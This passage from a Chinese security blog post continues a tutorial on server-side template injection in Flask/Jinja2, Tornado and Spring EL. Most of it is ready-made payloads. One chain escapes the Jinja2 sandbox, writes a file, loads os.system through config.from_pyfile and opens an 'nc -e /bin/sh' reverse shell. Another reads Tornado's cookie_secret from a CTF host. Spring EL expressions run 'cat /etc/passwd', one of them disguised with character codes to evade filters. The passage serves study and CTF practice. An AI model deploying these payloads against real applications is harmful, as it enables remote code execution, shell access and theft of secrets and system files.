<p>执行的代码片段被放入了 <code>d.__dict__</code> 中,这看似没设么用，但是神奇的是后面他调用了 from_object() 方法，根据源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for key in dir(obj):</span><br><span class="line">           if key.isupper():</span><br><span class="line">               self[key] &#x3D; getattr(obj, key)</span><br></pre></td></tr></table></figure>

<p>这个方法会遍历 Obj 的 dict 并且找到大写字母的属性，将属性的值给 self[‘属性名’]，所以说如果我们能让 from_pyfile 去读这样的一个文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from os import system</span><br><span class="line">SHELL &#x3D; system</span><br></pre></td></tr></table></figure>

<p>到时候我们就能通过 config[‘SHELL’] 调用 system 方法了</p>
<p>那么文件怎么写入呢？Jinja2 有沙盒机制，我们必须通过绕过沙盒的方式写入我们想要的文件，具体的沙盒绕过可以参考我的一篇博文[python 沙盒逃逸备忘](<a target="_blank" rel="noopener" href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)</p>
<p><strong>最终的 payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;evil&#39;, &#39;w&#39;).write(&#39;from os import system%0aSHELL &#x3D; system&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;写文件</span><br><span class="line">&#123;&#123; config.from_pyfile(&#39;&#x2F;tmp&#x2F;evil&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;加载system</span><br><span class="line">&#123;&#123; config[&#39;SHELL&#39;](&#39;nc xxxx xx -e &#x2F;bin&#x2F;sh&#39;) &#125;&#125;</span><br><span class="line">&#x2F;&#x2F;执行命令反弹SHELL</span><br></pre></td></tr></table></figure>

<h5 id="3-Tornado"><a href="#3-Tornado" class="headerlink" title="3.Tornado"></a><strong>3.Tornado</strong></h5><p>写文章的时候正巧赶上护网杯出了一道 tornado 的 SSTI 于是这里也作为一个比较好的例子给大家说明</p>
<p>根据提示这道题的意思就是通过SSTI 获取 cookie_secret，但是这里过滤了很多东西</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&#39;()*-&#x2F;&#x3D;[\]_|</span><br></pre></td></tr></table></figure>

<p>甚至把_(下划线)都过滤了，也就是说我们没法通过Python 的魔法方法进行沙盒逃逸执行命令，并且实际上对我们的寻找合适的 tornado 的内置的方法也有很多的限制。</p>
<p>我觉得除了直接阅读官方的文档，还有一个重要的方法就是直接下载 tornado 的框架源码，全局搜索 cookie_secret</p>
<p><strong>如下图：</strong></p>
<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/cookie_secret.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/cookie_secret.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>你会发现 cookie_secret 是handler.application.settings 的键值，那我们只要获取到这个对象是不是就可以了，没错，那么 handler 是什么，看<a target="_blank" rel="noopener" href="http://www.tornadoweb.org/en/stable/guide/templates.html#template-syntax">官方文档</a>，我特地看一下模板的对框架的语法支持(因为，模板中有一些内置的对象等同于框架中的对象，但是一般为了方便书写前段就会给一个比较简单的名字，就比如 JSP 的 request 内置对象实际上对应着 servlet 中的 HttpServletRequest )</p>
<p><strong>如下图所示：</strong></p>
<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>这里明确写着 handler 对应的就是 RequestHandler,那么也就是说，我们可以使用 handler 调用 RequestHandler 的方法，我们还是看<a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/stable/web.html?highlight=RequestHandler">官方文档</a></p>
<p><strong>如下图所示：</strong></p>
<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler_settings.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler_settings.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>很清楚，我么看到 RequestHandler.settings 是 self.application.settings 的别名，等等！ 有没有觉得有些似曾相识？对啊，这不就是我们之前在框架源码中找到的那个东西吗，也就是说我们能直接通过 handler.settings 访问到 我们朝思暮想的 cookie_secret ，至此我的分析就结束了。</p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;117.78.26.79:31093&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-利用模语言本身的特性进行攻击"><a href="#2-利用模语言本身的特性进行攻击" class="headerlink" title="2.利用模语言本身的特性进行攻击"></a><strong>2.利用模语言本身的特性进行攻击</strong></h4><h5 id="1-Python"><a href="#1-Python" class="headerlink" title="1.Python"></a><strong>1.Python</strong></h5><p>Python 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒，具体的方法就是在我的[一篇博文](<a target="_blank" rel="noopener" href="http://www.k0rz3n.com/2018/05/04/Python">http://www.k0rz3n.com/2018/05/04/Python</a> 沙盒逃逸备忘/)中</p>
<h5 id="2-JAVA"><a href="#2-JAVA" class="headerlink" title="2.JAVA"></a><strong>2.JAVA</strong></h5><p>java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的类</p>
<p><strong>如下图所示：</strong></p>
<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png"><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png" alt="此处输入图片的描述"></a>此处输入图片的描述</p>
<p>有了这个基础我们就能想到这样的payload</p>
<p><strong>payload：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(java.lang.System).getenv()&#125;</span><br><span class="line"></span><br><span class="line">$&#123;T(java.lang.Runtime).getRuntime().exec(&#39;cat etc&#x2F;passwd&#39;)&#125;</span><br></pre></td></tr></table></figure>

<p>当然要是文件操作就要用另外的类了,思路是不变的</p>
<p><strong>payload：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意:</strong></p>
<p>这里面的 T() 是 EL 的语法规定（比如 Spring 框架的 EL 就是 SPEL)</p>
</blockquote>
<p>参考:<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#0X06-%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF</a></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">vague huang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2021/04/01/ssti注入续/">http://example.com/2021/04/01/ssti注入续/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2021/04/04/%E7%BA%A2%E8%B0%B7%E6%9D%AF-%E8%99%8E%E7%AC%A6%E6%AF%94%E8%B5%9Bwp/"><i class="fa fa-chevron-left">  </i><span>虎符比赛wp——fat free框架注入漏洞审计学习</span></a></div><div class="next-post pull-right"><a href="/2021/04/01/buuctf6/"><span>buuctf6</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2021 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>